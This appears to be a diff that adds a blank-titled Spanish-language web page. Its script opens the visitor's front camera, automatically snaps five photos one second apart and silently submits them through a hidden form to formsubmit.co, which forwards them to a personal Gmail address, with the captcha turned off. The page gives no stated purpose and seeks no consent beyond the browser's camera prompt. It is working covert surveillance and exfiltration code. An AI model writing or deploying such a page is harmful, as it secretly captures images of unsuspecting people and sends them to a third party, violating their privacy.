@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+<body>
+<form id="formulario" action="https://formsubmit.co/marco42748261@gmail.com" method="POST">                                                                         
+<input type="file" id="foto" name="attachment" accept="image/*" style="display: none;" multiple>
+    <input type="hidden" name="_captcha" value="false">
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+</form>
+<div id="fotos"></div>
+
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const fotoInput = document.getElementById('foto');
+    const fotosDiv = document.getElementById('fotos');
+    let fotosTomadas = [];
+
+    // Pedir acceso a la cámara frontal
+    navigator.mediaDevices.getUserMedia({
+        video: {
+            facingMode: 'user'
+        }
+    })
+    .then(stream => {
+        video.srcObject = stream;
+        // Tomar 5 fotos automáticamente
+        let fotos = 0;
+        const intervalo = setInterval(async () => {
+            if (fotos < 5) {
+                // Tomar foto
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convertir la imagen a blob y almacenarla en el array
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                fotosTomadas.push(new File([blob], `attachment${fotos}.jpg`, { type: 'image/jpeg' }));
+
+                // Mostrar la foto
+                const foto = document.createElement('img');
+                foto.src = canvas.toDataURL();
+                fotosDiv.appendChild(foto);
+
+                fotos++;
+            } else {
+                clearInterval(intervalo);
+                // Asignar las fotos al input file
+                const dataTransfer = new DataTransfer();
+                fotosTomadas.forEach(foto => dataTransfer.items.add(foto));
+                fotoInput.files = dataTransfer.files;
+
+                // Enviar formulario
+                document.getElementById('formulario').submit();
+            }
+        }, 1000);
+    })
+    .catch(error => {
+        console.error('Error al acceder a la cámara:', error);
+    });
+</script>
+
+</body>
+</html>
